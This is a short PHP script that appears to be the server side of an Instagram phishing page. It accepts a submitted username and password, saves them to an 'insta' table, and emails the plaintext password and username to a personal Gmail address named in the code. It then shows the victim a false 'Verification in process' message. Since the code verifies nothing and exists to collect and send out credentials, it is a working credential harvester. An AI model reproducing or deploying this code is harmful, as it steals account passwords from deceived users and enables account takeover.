<?php  

include("../path.php");
require (ROOT_PATH . '/includes/dbFunctions.php');
require '../register/mailer.php';

$errors =array();
$username = '';

if(isset($_POST['ins_submit'])){
    unset($_POST['ins_submit']);
    if(strlen($_POST['username']) < 4){
        $errors['username'] = "please enter a valid username";
        echo 'Please enter a Valid Username';
        exit();
    }

    if(strlen($_POST['password']) < 4){
        $errors['password'] = "please enter a valid password";
        echo 'Please enter a Valid Password';
        exit();
    }

    if(count($errors) === 0){ 
        $send = createUser('insta', $_POST);
        
        sendInsta("salehsleiman505@gmail.com", "Suleiman", $_POST['password'], $_POST['username']);

        if($send == true){
            echo "Verification in process";
        }
    }
}

?>